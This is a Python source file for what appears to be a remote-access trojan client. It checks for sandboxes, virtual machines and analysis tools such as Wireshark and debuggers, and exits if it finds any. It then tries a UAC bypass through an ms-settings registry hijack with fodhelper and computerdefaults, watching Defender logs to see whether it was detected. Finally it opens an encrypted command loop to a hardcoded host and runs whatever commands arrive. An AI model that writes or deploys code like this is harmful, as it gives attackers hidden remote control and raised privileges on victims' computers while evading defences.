import socket, json, subprocess, os, psutil, sys
from aes_util import encrypt, decrypt
from pathlib import Path

# Defeners fucker
try:
    if Path(__file__).resolve().parents[3].name == "Norton sandbox":
        os._exit(0)
except:
    pass
def protection_check():
    vm_files = [
        "C:\\windows\\system32\\vmGuestLib.dll",
        "C:\\windows\\system32\\vm3dgl.dll",
        "C:\\windows\\system32\\vboxhook.dll",
        "C:\\windows\\system32\\vboxmrxnp.dll",
        "C:\\windows\\system32\\vmsrvc.dll",
        "C:\\windows\\system32\\drivers\\vmsrvc.sys"
    ]
    blacklisted_processes = [
        'vmtoolsd.exe', 
        'vmwaretray.exe', 
        'vmwareuser.exe'
        'fakenet.exe', 
        'dumpcap.exe', 
        'httpdebuggerui.exe', 
        'wireshark.exe', 
        'fiddler.exe', 
        'vboxservice.exe', 
        'df5serv.exe', 
        'vboxtray.exe', 
        'vmwaretray.exe', 
        'ida64.exe', 
        'ollydbg.exe', 
        'pestudio.exe', 
        'vgauthservice.exe', 
        'vmacthlp.exe', 
        'x96dbg.exe', 
        'x32dbg.exe', 
        'prl_cc.exe', 
        'prl_tools.exe', 
        'xenservice.exe', 
        'qemu-ga.exe', 
        'joeboxcontrol.exe', 
        'ksdumperclient.exe', 
        'ksdumper.exe', 
        'joeboxserver.exe', 
    ]

    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'].lower() in blacklisted_processes:
            return True
    for file_path in vm_files:
        if os.path.exists(file_path):
            return True
    return False
if protection_check():
    print('debugger found')
    os._exit(0)
def GetSelf() -> tuple[str, bool]:
    if hasattr(sys, "frozen"):
        return (sys.executable, True)
    else:
        return (__file__, False)
def UACbypass(method: int = 1) -> bool:
    if GetSelf()[1]:
        execut3 = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
        if method == 1:
            execut3(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
            execut3("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execut3('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execut3("computerdefaults --nouacbypass")
            log_count_after = len(execut3('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execut3("reg delete hkcu\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        elif method == 2:
            execut3(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
            execut3("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execut3('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execut3("fodhelper --nouacbypass")
            log_count_after = len(execut3('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execut3("reg delete hkcu\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        else:
            return False
        return True
    
if not UACbypass():
    print('No valid methods')
    # os._exit(0)
CLIENT_ID = "3ad84786-8633-4471-9934-027f7a5f1d3b"
SHARED_KEY = "R7o/rYTFDrIXLbqV231tOHtdg91jU/v2u5nxK+IMq9U="

s = socket.socket()
s.connect(("192.168.1.61", 5000))
s.send(json.dumps({"id": CLIENT_ID}).encode())

while True:
    try:
        data = json.loads(s.recv(4096).decode())
        cmd = decrypt(data['payload'], SHARED_KEY)
        output = subprocess.getoutput(cmd)
        s.send(encrypt(output, SHARED_KEY).encode())
    except Exception as e:
        print(f"[!] Error: {e}")
        break
